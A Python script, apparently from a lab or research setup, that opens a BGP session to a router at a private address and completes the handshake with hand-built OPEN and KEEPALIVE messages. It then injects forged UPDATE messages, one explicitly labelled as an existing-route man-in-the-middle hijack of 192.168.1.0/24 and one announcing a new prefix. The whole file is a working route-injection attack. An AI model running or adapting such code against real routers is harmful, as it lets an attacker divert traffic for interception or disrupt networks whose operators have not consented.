from bgp_packets import BGPUpdate, BGPNotification, BGPKeepAlive, BGPOpen
from fields import IntField, StringField, ListField, LengthField, Field, MetaField
from bgp_fields import (
    IPv4AddressField,
    PathAttribute,
    Origin,
    ASPath,
    NextHop,
    MultiExitDisc,
    LocalPref,
    NetworkLayerReachabilityInformation,
    Capability,
    MultiprotocolExtensions,
    RouteRefresh,
    BGPExtended,
    GracefulRestart,
    FourOctetASNumber,
    Dynamic,
    AdditionalPaths,
    EnhancedRouteRefresh,
    LongLivedGracefulRestart,
    FQDN,
    SoftwareVersion,
    PathsLimit,
    OptionalParameter,
    BGPHeader,
)
import socket

from scapy.all import IP, TCP, send, sniff, Ether


def gen_bgp_response(data: bytes) -> ListField:
    # marker = int.from_bytes(data[:16], 'big')
    msg_type = int.from_bytes(data[18:19], 'big')
    # header = BGPHeader(msg_type, marker)
    match msg_type:
        case 1:
            resp = BGPOpen(4, '192.168.0.1', 64510, 15)
            capabilities = [
                MultiprotocolExtensions(1, 1),
                RouteRefresh(),
                EnhancedRouteRefresh(),
                FourOctetASNumber(64510),
                BGPExtended(),
                AdditionalPaths(1, 1, True),
                PathsLimit(0x0001010000),
                Dynamic(),
                FQDN('H-1', ''),
                SoftwareVersion('FRRouting/10.1.1')
            ]
            opt_params = [OptionalParameter(2) for _ in range(len(capabilities))]
            for i, capability in enumerate(capabilities):
                opt_params[i].set_capability(capability)

            resp.optional_parameters.extend(opt_params)
            return resp
        case 2: # BGPUpdate
            return None
        case 3: # BGPNotification
            return None
        case 4: # BGPKeepAlive
            return BGPKeepAlive()
        case _:
            raise ValueError(f'Unknown BGP packet type: {msg_type}')


def do_bgp_handshake(sock):
    # # Exchange BGPOpen
    # resp = gen_bgp_response(init_open) # BGPOpen
    # if resp is not None:
    #     sock.send(resp.to_bytes())

    # Exchange BGPKeepAlive
    keepalive1 = sock.recv(1024)
    resp = gen_bgp_response(keepalive1) # BGPKeepAlive
    if resp is not None:
        sock.send(resp.to_bytes())


    # Send Update Reflecting Current Routing Table (Empty)
    update = BGPUpdate()

    sock.send(update.to_bytes())
    print('BGP Update sent.')

    resp_update = sock.recv(1024)

    # Exchange BGPKeepAlive
    keepalive2 = sock.recv(1024)
    resp = gen_bgp_response(keepalive2) # BGPKeepAlive
    if resp is not None:
        sock.send(resp.to_bytes())

    return resp_update

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.0.254', 179))
    open = BGPOpen(4, '192.168.0.1', 64510, 15)
    capabilities = [
        MultiprotocolExtensions(1, 1),
        RouteRefresh(),
        EnhancedRouteRefresh(),
        FourOctetASNumber(64510),
        BGPExtended(),
        AdditionalPaths(1, 1, True),
        PathsLimit(0x0001010000),
        GracefulRestart(False, True, 120),
        LongLivedGracefulRestart(0x00010180000000)
    ]
    opt_params = [OptionalParameter(2) for _ in range(len(capabilities))]
    for i, capability in enumerate(capabilities):
        opt_params[i].set_capability(capability)

    open.optional_parameters.extend(opt_params)
    client.send(open.to_bytes())
    _ = client.recv(1024)
    print('Starting BGP handshake...')
    do_bgp_handshake(client)
    print('BGP handshake complete.')

    from time import sleep
    import threading

    def do_keepalive_loop(sock):
        while True:
            keepalive = BGPKeepAlive()
            sock.send(keepalive.to_bytes())
            sleep(5)


    threading.Thread(target=do_keepalive_loop, args=(client,)).start()

    sleep(16)

    print('Sending BGP Update For Existing Route (MITM)...')
    update = BGPUpdate()
    origin = Origin(0x40, 0)
    as_path = ASPath(0x50, 4, [64510])
    next_hop = NextHop(0x40, '192.168.0.1')
    med = MultiExitDisc(0x80, 0)
    local_pref = LocalPref(0x40, 100)
    nlri = NetworkLayerReachabilityInformation('192.168.1.0', 24)
    update.path_attributes.extend([origin, as_path, next_hop, med, local_pref])
    update.set_nlri(nlri)
    client.send(update.to_bytes())
    print('BGP Update sent.\n')

    sleep(16)

    print('Sending BGP Update For New Route...')
    update = BGPUpdate()
    origin = Origin(0x40, 0)
    as_path = ASPath(0x50, 4, [64510])
    next_hop = NextHop(0x40, '192.168.0.1')
    med = MultiExitDisc(0x80, 0)
    nlri = NetworkLayerReachabilityInformation('192.168.5.0', 24)
    update.path_attributes.extend([origin, as_path, next_hop, med, local_pref])
    update.set_nlri(nlri)
    client.send(update.to_bytes())
    print('BGP Update sent.')


if __name__ == '__main__':
    main()
